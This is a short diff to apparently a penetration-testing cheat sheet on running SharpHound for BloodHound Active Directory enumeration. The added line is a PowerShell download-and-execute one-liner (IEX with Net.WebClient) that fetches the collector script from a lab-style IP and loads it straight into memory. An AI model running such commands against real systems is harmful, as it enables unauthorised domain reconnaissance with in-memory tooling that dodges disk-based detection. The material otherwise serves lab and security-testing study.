@@ -23,6 +23,7 @@ sudo neo4j console
 ## Running SharpHound
 ```
 Install the module: . .\SharpHound.ps1
+IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/SharpHound.ps1') #Loads directly into memory#
 Invoke-BloodHound -CollectionMethod All -Domain <domain> -ZipFileName <filename.zip>
 ```
 
